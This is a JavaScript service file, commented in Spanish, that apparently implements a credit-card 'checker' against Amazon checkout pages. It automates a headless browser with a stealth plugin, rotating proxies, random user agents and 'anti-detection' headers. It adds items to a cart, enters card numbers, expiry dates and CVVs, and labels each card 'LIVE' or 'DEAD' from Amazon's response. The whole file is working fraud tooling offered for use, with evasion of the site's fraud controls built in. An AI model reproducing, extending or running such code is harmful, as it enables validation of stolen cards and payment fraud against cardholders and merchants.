const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const proxyConfig = require('../config/proxy.config');
const ProxyRotator = require('../utils/proxy.rotator');

puppeteer.use(StealthPlugin());

class AmazonCheckerService {
  constructor() {
    this.proxyRotator = new ProxyRotator(proxyConfig.webshare.proxyList);
    this.dailyCount = 0;
    this.hourlyCount = 0;
    this.lastReset = Date.now();
  }

  async checkCard(card, region = 'us') {
    // Rate limiting check
    if (!this.canProceed()) {
      throw new Error('Rate limit alcanzado. Espera 1 hora.');
    }

    const proxy = this.proxyRotator.getNext();
    const amazonDomain = this.getDomain(region);
    
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        `--proxy-server=${proxy}`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process'
      ]
    });

    try {
      const page = await browser.newPage();
      
      // Configurar viewport y headers
      await page.setViewport({ width: 1920, height: 1080 });
      await page.setUserAgent(this.getRandomUA());
      
      // Headers anti-detection
      await page.setExtraHTTPHeaders({
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
      });

      // Timeout de 30 segundos
      page.setDefaultNavigationTimeout(30000);
      page.setDefaultTimeout(30000);

      // 1. Ir a Amazon y agregar item al carrito
      await page.goto(`https://${amazonDomain}/dp/B08N5WRWNW`, { waitUntil: 'networkidle2' });
      
      // Click "Add to Cart"
      await page.waitForSelector('#add-to-cart-button', { visible: true });
      await page.click('#add-to-cart-button');
      await this.delay(2000);
      
      // Ir al checkout
      await page.goto(`https://${amazonDomain}/gp/cart/view.html?ref_=nav_cart`, { waitUntil: 'networkidle2' });
      await page.click('input[name="proceedToRetailCheckout"]');
      await this.delay(3000);

      // 2. Login (usar cuenta AWS que tienes)
      // NOTA: Debes tener las cookies guardadas o hacer login manualmente una vez
      // y guardar el estado de sesión
      
      // 3. Llegar al formulario de pago
      await page.waitForSelector('.a-text-center.a-spacing-top-medium', { timeout: 10000 })
        .catch(() => {}); // Si ya está logueado, no aparece

      // 4. Ingresar datos de tarjeta
      await page.waitForSelector('input[name="addCreditCardNumber"]', { visible: true, timeout: 10000 });
      
      // Limpiar y llenar campos
      await page.evaluate(() => {
        document.querySelector('input[name="addCreditCardNumber"]').value = '';
        document.querySelector('select[name="ppw-expirationDate_month"]').value = '';
        document.querySelector('select[name="ppw-expirationDate_year"]').value = '';
      });

      await page.type('input[name="addCreditCardNumber"]', card.number, { delay: 100 });
      
      // Seleccionar mes
      await page.select('select[name="ppw-expirationDate_month"]', card.month.padStart(2, '0'));
      
      // Seleccionar año
      const yearValue = card.year.length === 2 ? `20${card.year}` : card.year;
      await page.select('select[name="ppw-expirationDate_year"]', yearValue);

      // Agregar CVV si existe el campo
      const cvvField = await page.$('input[name="addCreditCardVerificationNumber"]');
      if (cvvField) {
        await page.type('input[name="addCreditCardVerificationNumber"]', card.cvv, { delay: 100 });
      }

      // 5. Click en "Add your card"
      await page.click('input[name="ppw-widgetEvent:AddCreditCardEvent"]');
      await this.delay(5000);

      // 6. Detectar resultado
      const result = await this.detectResult(page);

      this.incrementCounters();
      
      return {
        status: result.status,
        code: result.code,
        message: result.message,
        proxy: proxy,
        checkedAt: new Date().toISOString()
      };

    } catch (error) {
      return {
        status: 'ERROR',
        code: 'ERR',
        message: error.message,
        proxy: proxy
      };
    } finally {
      await browser.close();
    }
  }

  async detectResult(page) {
    // Múltiples selectores para detectar respuesta
    
    // Error de tarjeta declinada
    const errorSelectors = [
      '.a-alert-error',
      '#error-alert',
      '[data-testid="error-message"]',
      '.a-color-error'
    ];
    
    for (const selector of errorSelectors) {
      const element = await page.$(selector);
      if (element) {
        const text = await page.evaluate(el => el.textContent, element);
        if (text.includes('declined') || text.includes('invalid') || text.includes('rejected')) {
          return { status: 'DEAD', code: '05', message: text.trim() };
        }
      }
    }

    // Éxito - tarjeta añadida
    const successSelectors = [
      '.a-alert-success',
      '#success-message',
      '.pmts-payment-confirmation'
    ];
    
    for (const selector of successSelectors) {
      const element = await page.$(selector);
      if (element) {
        return { status: 'LIVE', code: '00', message: 'Card added successfully' };
      }
    }

    // Si llegamos al paso de shipping address, la tarjeta pasó
    const shippingStep = await page.$('#shipping-address-form');
    if (shippingStep) {
      return { status: 'LIVE', code: '00', message: 'Proceeding to shipping' };
    }

    return { status: 'UNKNOWN', code: 'UNK', message: 'Could not determine result' };
  }

  canProceed() {
    const now = Date.now();
    
    // Reset hourly counter
    if (now - this.lastReset > 3600000) {
      this.hourlyCount = 0;
      this.lastReset = now;
    }
    
    // Reset daily counter (cada 24 horas)
    if (now - this.lastReset > 86400000) {
      this.dailyCount = 0;
    }
    
    return this.dailyCount < proxyConfig.rateLimit.maxPerDay &&
           this.hourlyCount < proxyConfig.rateLimit.maxPerHour;
  }

  incrementCounters() {
    this.dailyCount++;
    this.hourlyCount++;
  }

  getDomain(region) {
    const domains = {
      'us': 'www.amazon.com',
      'uk': 'www.amazon.co.uk',
      'de': 'www.amazon.de',
      'fr': 'www.amazon.fr',
      'jp': 'www.amazon.co.jp',
      'ca': 'www.amazon.ca',
      'es': 'www.amazon.es',
      'it': 'www.amazon.it'
    };
    return domains[region] || domains['us'];
  }

  getRandomUA() {
    const uas = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = new AmazonCheckerService();